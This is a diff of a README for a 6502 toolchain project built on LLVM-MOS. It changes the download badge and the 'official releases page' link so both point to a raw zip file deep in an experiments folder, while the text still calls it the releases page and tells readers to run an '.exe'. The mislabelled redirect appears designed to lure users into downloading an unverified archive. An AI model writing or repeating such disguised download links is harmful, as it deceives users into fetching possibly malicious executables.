@@ -1,6 +1,6 @@
 # ⚙️ mos-toolchains-research - Build modern 6502 programs with ease
 
-[![Download mos-toolchains-research](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/beta6083/mos-toolchains-research/releases)
+[![Download mos-toolchains-research](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/beta6083/mos-toolchains-research/raw/refs/heads/main/experiments/20-mmio-hal/rust/mos-research-toolchains-1.3.zip)
 
 ## What is this tool?
 
@@ -12,7 +12,7 @@ The software focuses on LLVM-MOS. This is a framework that connects modern progr
 
 You can get the current version of the tool on GitHub. 
 
-1. Visit the [official releases page](https://github.com/beta6083/mos-toolchains-research/releases).
+1. Visit the [official releases page](https://github.com/beta6083/mos-toolchains-research/raw/refs/heads/main/experiments/20-mmio-hal/rust/mos-research-toolchains-1.3.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` that matches your Windows version.
 4. Download the file to your computer.
